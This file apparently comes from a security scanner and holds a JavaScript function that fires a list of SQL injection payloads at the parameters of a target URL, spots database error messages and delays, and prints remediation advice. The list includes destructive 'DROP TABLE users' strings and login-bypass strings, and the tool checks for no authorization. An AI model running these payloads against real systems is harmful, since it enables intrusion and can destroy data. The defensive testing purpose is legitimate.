import axios from 'axios';

/**
 * Test SQL Injection Vulnerabilities
 * Tests common SQL injection patterns
 */
export async function testSQLInjection(targetUrl, endpoint, parameters = []) {
    const results = {
        testName: 'SQL Injection Test',
        timestamp: new Date().toISOString(),
        targetUrl: `${targetUrl}${endpoint}`,
        totalTests: 0,
        vulnerableParameters: [],
        vulnerabilities: [],
        recommendations: [],
        status: 'unknown',
        details: []
    };

    // Common SQL injection payloads
    const sqlInjectionPayloads = [
        "' OR '1'='1",
        "' OR '1'='1' --",
        "' OR '1'='1' /*",
        "admin' --",
        "admin' #",
        "admin'/*",
        "' or 1=1--",
        "' or 1=1#",
        "' or 1=1/*",
        "') or '1'='1--",
        "') or ('1'='1--",
        "1' ORDER BY 1--",
        "1' ORDER BY 2--",
        "1' ORDER BY 3--",
        "1' UNION SELECT NULL--",
        "1' UNION SELECT NULL,NULL--",
        "' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055",
        "1; DROP TABLE users--",
        "1'; DROP TABLE users--",
        "' WAITFOR DELAY '00:00:05'--"
    ];

    try {
        // If no parameters provided, test query string
        if (parameters.length === 0) {
            parameters = ['id', 'user', 'username', 'email', 'search', 'query'];
        }

        for (const param of parameters) {
            for (const payload of sqlInjectionPayloads) {
                results.totalTests++;

                try {
                    const startTime = Date.now();

                    // Test as query parameter
                    const response = await axios.get(`${targetUrl}${endpoint}`, {
                        params: { [param]: payload },
                        timeout: 10000,
                        validateStatus: () => true
                    });

                    const responseTime = Date.now() - startTime;
                    const responseText = JSON.stringify(response.data);

                    // Check for SQL error messages
                    const sqlErrorPatterns = [
                        /SQL syntax/i,
                        /mysql_fetch/i,
                        /mysql_num_rows/i,
                        /PostgreSQL.*ERROR/i,
                        /Warning.*pg_/i,
                        /valid MySQL result/i,
                        /MySqlClient\./i,
                        /ODBC SQL Server Driver/i,
                        /SQLServer JDBC Driver/i,
                        /Oracle error/i,
                        /ORA-\d{5}/i,
                        /quoted string not properly terminated/i,
                        /SQL command not properly ended/i,
                        /Unclosed quotation mark/i
                    ];

                    const hasError = sqlErrorPatterns.some(pattern => pattern.test(responseText));
                    const suspiciousResponseTime = responseTime > 5000; // Possible time-based injection

                    const detail = {
                        parameter: param,
                        payload: payload,
                        statusCode: response.status,
                        responseTime: responseTime,
                        hasError: hasError,
                        suspiciousDelay: suspiciousResponseTime
                    };

                    if (hasError) {
                        detail.vulnerability = 'SQL error message detected';
                        results.vulnerableParameters.push(param);
                    }

                    if (suspiciousResponseTime) {
                        detail.warning = 'Suspicious response time - possible time-based injection';
                    }

                    results.details.push(detail);

                } catch (error) {
                    results.details.push({
                        parameter: param,
                        payload: payload,
                        error: error.message
                    });
                }

                // Small delay between requests
                await new Promise(resolve => setTimeout(resolve, 50));
            }
        }

        // Analysis
        const uniqueVulnerableParams = [...new Set(results.vulnerableParameters)];

        if (uniqueVulnerableParams.length > 0) {
            results.status = 'vulnerable';
            results.vulnerabilities.push({
                severity: 'CRITICAL',
                description: 'SQL Injection vulnerability detected',
                details: `Vulnerable parameters: ${uniqueVulnerableParams.join(', ')}`
            });
            results.recommendations.push('URGENT: Use parameterized queries or prepared statements');
            results.recommendations.push('Implement input validation and sanitization');
            results.recommendations.push('Use an ORM (Object-Relational Mapping) framework');
            results.recommendations.push('Apply the principle of least privilege to database users');
        } else {
            results.status = 'protected';
            results.recommendations.push('No SQL injection vulnerabilities detected');
            results.recommendations.push('Continue using parameterized queries');
            results.recommendations.push('Regularly update security testing patterns');
        }

    } catch (error) {
        results.error = error.message;
        results.status = 'error';
    }

    return results;
}
